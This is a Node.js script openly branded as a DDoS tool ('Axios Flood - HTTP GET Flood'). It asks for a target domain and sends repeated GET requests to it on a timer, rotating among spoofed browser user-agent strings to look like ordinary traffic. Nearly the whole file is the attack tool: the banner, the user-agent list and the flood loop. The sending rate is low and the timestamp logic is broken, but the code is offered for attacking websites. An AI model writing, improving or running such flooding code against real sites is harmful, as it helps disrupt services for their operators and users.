//Modules
const axios = require("axios");
const readline = require("readline");
const date = require("date-and-time");
const { exec } = require("child_process");
const clear = require("clear-console");
const now = new Date();
const Time = date.format(now, "HH:mm:ss");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
//Colors
const G = `\x1b[32m`;
const C = `\x1b[36m`;
const R = `\x1b[31m`;
const Y = `\x1b[33m`;
const B = `\x1b[30m`;
const M = `\x1b[35m`;
const d = `\x1b[0m`;
const bl = `\x1b[1m`;
//BgColorText
const BRed = `\x1b[41m`;
const BGre = `\x1b[42m`;
const BYel = `\x1b[43m`;
const BCya = `\x1b[46m`;
const icon = `
                                                                                          ${bl}${G}:=+##%%#*+-.${d}
     ${bl}${Y}..+#####################*=${d}                                                         ${bl}${G}+%#==@# :@#-+%#-${d}
     ${bl}${Y}##-:*%%%%%%%%%%%%%%%%%%=:=%=${d}                                                     ${bl}${G}=@*.  #@   -@-  -%%.${d}
     ${bl}${Y}#%%#=:+%%%%%%%%%%%%%#-:+%%%=${d}                                        ${bl}${R}+${d}           ${bl}${G}+@*---=@*----@%----%@:${d}
     ${bl}${Y}#%%%%%+:-#%%%%%%%%*:-#%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=.${d}      ${bl}${G}:@*++++#@+++++#@+++++%%${d}
     ${bl}${Y}#%%%%%%%*:-*%%%%+:=#%%%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*-${d}   ${bl}${G}*@     +@     +@.    =@.${d}
     ${bl}${Y}#%%%%%%%=:==:==:+-:*%%%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=.${d}   ${bl}${G}+@     +@     +@.    =@.${d}
     ${bl}${Y}#%%%%#-:*%%%%#%%%%%=:+%%%%%=${d}                                       ${bl}${R}.@*=.${d}       ${bl}${G}.@%####%@%####@@#####@#${d}
     ${bl}${Y}#%%*:-#%%%%%%%%%%%%%%+:=#%%=${d}                                                    ${bl}${G}-@+   .@*    @#   .%%.${d}
     ${bl}${Y}#+:=#%%%%%%%%%%%%%%%%%%*--*-${d}                                                     ${bl}${G}:#%-  *@.  =@: .+@+${d}
      ${bl}${Y}.=++++++++++++++++++++++-${d}                                                         ${bl}${G}:*@#+@%-=@%+%%+.${d}
                                                                                           ${bl}${G}.-++*++=-.${d}

                                     B  Y   Z  E  L  T   N  A  M  I  Z  A  K  E
               █████╗ ██╗  ██╗██╗ ██████╗ ███████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
              ██╔══██╗╚██╗██╔╝██║██╔═══██╗██╔════╝    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
              ███████║ ╚███╔╝ ██║██║   ██║███████╗    █████╗  ██║     ██║   ██║██║   ██║██║  ██║
              ██╔══██║ ██╔██╗ ██║██║   ██║╚════██║    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
              ██║  ██║██╔╝ ██╗██║╚██████╔╝███████║    ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
              ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
                               ${bl}A X I O S  F L O O D  -  H T T P  G E T  F L O O D${d}
                                     ${bl}${R}DDoS Attack Website with HTTP GET Flood${d}
`;
clear();
//Function HTTP GET Flood
setTimeout(() => {
    console.log(icon);
    rl.question(`Enter Domain or URL Website: `, domain => {
        if (domain) {
            function getflood() {
                //UserAgents
                var UserAgents = [
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1",
                    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0",
                    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
                    "Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1",
                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0",
                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54",
                    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
                    "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",
                    "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
                ];

                // Message Success Sending
                var Success = [
                    `[ ${bl}${G}+${d} ]${G}${bl}Success Sending Request to${d} ${bl}${BGre} ${domain} ${d} `,
                    `[ ${bl}${Y}+${d} ]${Y}${bl}Success Sending Request to${d} ${bl}${BYel} ${domain} ${d} `
                ];
                //Message Failed Sending
                var Failed = [
                    `[ ${bl}${R}+${d} ]${R}${bl}Failed Sending Request  to${d} ${bl}${BRed} ${domain} ${d} `,
                    `[ ${bl}${C}+${d} ]${C}${bl}Failed Sending Request  to${d} ${bl}${BCya} ${domain} ${d} `
                ];

                //Random UserAgents, MSS, MFS
                var agent =
                    UserAgents[Math.floor(Math.random() * UserAgents.length)];
                var success =
                    Success[Math.floor(Math.random() * Success.length)];
                var failed = Failed[Math.floor(Math.random() * Failed.length)];

                // Headers
                const Headers = {
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": `${agent}`
                    }
                };

                //Axios HTTP Request GET Flood
                axios
                    .get(`https://${domain}`, Headers)
                    .then(response => {
                        console.log(success + `| ${bl}${Time}${d}`);
                    })
                    .catch(() => {
                        console.log(failed + `| ${bl}${Time}${d}`);
                    });
            }
            setInterval(getflood, 3000);
        } else {
            console.log("Domain not found!");
            rl.close();
        }
    });
}, 500);
